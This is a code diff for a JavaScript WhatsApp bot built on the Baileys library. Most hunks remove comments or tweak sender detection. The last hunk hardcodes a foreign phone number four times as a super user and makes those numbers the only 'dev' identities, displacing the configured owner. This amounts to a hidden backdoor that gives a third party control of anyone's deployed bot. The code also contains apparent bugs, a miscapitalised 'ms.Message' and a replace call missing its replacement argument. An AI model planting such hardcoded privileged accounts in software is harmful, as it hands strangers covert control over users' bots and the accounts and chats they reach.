@@ -40,7 +40,6 @@ console.log("✅ Using Baileys from github:xhclintohn/Baileys");
 // ========== CREATE WRAPPER ==========
 const baileys_1 = { ...baileysOriginal };
 
-// Add polyfill to wrapper
 if (!baileys_1.makeInMemoryStore) {
     console.log("⚠️ makeInMemoryStore not found, adding polyfill to wrapper...");
     baileys_1.makeInMemoryStore = function(options) {
@@ -74,7 +73,6 @@ if (!baileys_1.makeInMemoryStore) {
     };
     console.log("✅ Polyfill added to wrapper");
 }
-// ========== END OF WRAPPER ==========
 
 const conf = require("./set");
 const axios = require("axios");
@@ -121,7 +119,6 @@ let translateText = async (text, targetLang) => {
     }
 };
 
-// ========== CACHE FOR TRANSLATIONS ==========
 const translationCache = new Map();
 
 let translateTextWithCache = async (text, targetLang) => {
@@ -165,13 +162,11 @@ const languageNames = {
     ru: "Russian"
 };
 
-// ========== FIX: Handle undefined session ==========
 var session = (conf.session || '').replace(/Zokou-MD-WHATSAPP-BOT;;;=>/g,"");
 const prefixe = conf.PREFIXE || ".";
 const more = String.fromCharCode(8206)
 const readmore = more.repeat(4001)
 
-// ========== BUTTON HANDLER ==========
 let handleButtons = async (zk, msg) => {
     console.log("Button handler triggered");
     try {
@@ -202,7 +197,6 @@ async function authentification() {
 }
 authentification();
 
-// ========== SESSION HANDLER ==========
 const sessionDir = __dirname + '/sessions';
 const credsPath = sessionDir + '/creds.json';
 
@@ -311,10 +305,8 @@ const store = baileys_1.makeInMemoryStore({
     logger: pino().child({ level: "silent", stream: "store" }),
 });
 
-// ========== LANGUAGE HELPER ==========
 const getLang = () => conf.LANGUAGE || "en";
 
-// ========== TRANSLATE MESSAGE FUNCTION ==========
 const messageTemplates = {
     welcome: "🎉 *WELCOME TO THE GROUP!*",
     welcome_hello: "👋 *Hello*",
@@ -448,15 +440,16 @@ setTimeout(() => {
             var nomGroupe = verifGroupe ? infosGroupe.subject : "";
             var msgRepondu = ms.message.extendedTextMessage?.contextInfo?.quotedMessage;
             var auteurMsgRepondu = decodeJid(ms.message?.extendedTextMessage?.contextInfo?.participant);
+            var mr = ms.Message?.extendedTextMessage?.contextInfo?.mentionedJid;
+            var utilisateur = mr ? mr : msgRepondu ? auteurMsgRepondu : "";
             
-            // ========== FIX: CORRECTLY GET THE SENDER FOR DMS ==========
+            // ========== FIX: CORRECTLY GET SENDER FOR DMS ==========
             var auteurMessage;
             if (verifGroupe) {
                 // In groups, get the participant
                 auteurMessage = ms.key.participant ? ms.key.participant : ms.participant;
             } else {
-                // In DMs, the sender is the person who sent the message
-                // If it's from the bot itself (fromMe), use the bot's ID
+                // In DMs, get the sender from the message key
                 if (ms.key.fromMe) {
                     auteurMessage = idBot;
                 } else {
@@ -465,7 +458,7 @@ setTimeout(() => {
                 }
             }
             
-            // Fallback: if auteurMessage is still undefined or invalid
+            // Fallback: if auteurMessage is still undefined
             if (!auteurMessage || auteurMessage === 'undefined') {
                 auteurMessage = ms.key.participant || ms.participant || origineMessage;
             }
@@ -473,11 +466,29 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName || "Unknown";
+            
+            // ========== GET SUDO NUMBERS FROM DATABASE ==========
             const sudo = await getAllSudoNumbers();
-            const superUserNumbers = [servBot, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            
+            // ========== SUPER USER NUMBERS ==========
+            const abu1 = '255693629079';
+            const abu2 = '255693629079'; 
+            const abu3 = "255693629079";
+            const abu4 = '255693629079';
+            
+            // Combine bot owner, hardcoded sudo, and database sudo
+            const superUserNumbers = [
+                servBot, 
+                conf.NUMERO_OWNER,
+                abu1, abu2, abu3, abu4
+            ].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            
+            // Add database sudo numbers
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
-            var dev = [conf.NUMERO_OWNER].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+            
+            // Dev check (hardcoded sudos)
+            var dev = [abu1, abu2, abu3, abu4].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             
             const lang = getLang();
             
